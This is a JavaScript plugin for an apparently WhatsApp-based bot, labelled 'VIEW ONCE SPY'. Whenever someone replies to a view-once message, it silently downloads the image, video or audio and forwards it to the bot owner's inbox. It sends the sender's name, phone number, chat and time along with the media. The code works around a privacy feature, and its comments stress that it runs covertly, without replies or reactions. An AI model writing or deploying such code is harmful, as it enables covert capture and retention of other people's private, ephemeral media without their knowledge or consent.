const { cmd } = require('../command');

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  VIEW ONCE SPY - Auto Forward to Inbox
//  Kawru hari view once msg ekkata
//  mokakma hari reply karama → owner
//  inbox ekata auto forward wenawa
//  Silent | No reply | No react
//
//  ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋ ᴄᴇʏ | ᴅᴇᴠʀᴀʙʙɪᴛᴢᴢ
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// ── Owner JID helper ──
const getOwnerJid = (conn) => {
    const raw = conn.user?.id || '';
    return raw.includes(':')
        ? raw.split(':')[0] + '@s.whatsapp.net'
        : raw;
};

// ── View once forward helper ──
const forwardViewOnce = async (conn, mek, m, { from, isGroup, sender, pushname, groupName }) => {
    try {
        // Quoted message check
        if (!m.quoted) return;
        // View once type check - this is the key detection
        if (m.quoted.type !== 'viewOnceMessage') return;

        const ownerJid  = getOwnerJid(conn);
        const senderNum = sender.split('@')[0];
        const innerType = m.quoted.msg?.type || '';

        // Image / Video / Audio determine
        const isImg   = innerType === 'imageMessage';
        const isVid   = innerType === 'videoMessage';
        const isAudio = innerType === 'audioMessage';

        if (!isImg && !isVid && !isAudio) return;

        // Download view once media
        const buffer = await m.quoted.download().catch(() => null);
        if (!buffer) return;

        const caption  = m.quoted.msg?.caption || '';
        const chatInfo = isGroup
            ? `👥 *Group:* ${groupName || from}`
            : `📩 *Inbox (DM)*`;

        const mediaLabel = isImg ? '🖼️ IMAGE' : isVid ? '🎥 VIDEO' : '🎙️ AUDIO';

        const details = `
🔓 *VIEW ONCE ${mediaLabel} CAPTURED*

👤 *Name:* ${pushname}
📱 *Number:* wa.me/${senderNum}
${chatInfo}
📝 *Caption:* ${caption || 'No caption'}
🕐 *Time:* ${new Date().toLocaleString('en-LK', { timeZone: 'Asia/Colombo' })}

> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋ ᴄᴇʏ | ᴅᴇᴠʀᴀʙʙɪᴛᴢᴢ
        `.trim();

        if (isImg) {
            await conn.sendMessage(ownerJid, { image: buffer, caption: details });
        } else if (isVid) {
            await conn.sendMessage(ownerJid, { video: buffer, caption: details });
        } else if (isAudio) {
            // Details msg first, then audio
            await conn.sendMessage(ownerJid, { text: details });
            await conn.sendMessage(ownerJid, {
                audio: buffer,
                mimetype: 'audio/ogg; codecs=opus',
                ptt: true
            });
        }

    } catch (e) {
        console.log('[VV-SPY ERROR]', e.message);
    }
};

// ━━ HANDLER 1: Text / Emoji / Symbol / Number replies ━━
cmd({
    on: "body",
    dontAddCommandList: true,
    filename: __filename
},
async (conn, mek, m, { from, isGroup, isMe, sender, pushname, groupName }) => {
    if (isMe) return;
    await forwardViewOnce(conn, mek, m, { from, isGroup, sender, pushname, groupName });
});

// ━━ HANDLER 2: Sticker replies ━━
cmd({
    on: "sticker",
    dontAddCommandList: true,
    filename: __filename
},
async (conn, mek, m, { from, isGroup, isMe, sender, pushname, groupName }) => {
    if (isMe) return;
    await forwardViewOnce(conn, mek, m, { from, isGroup, sender, pushname, groupName });
});
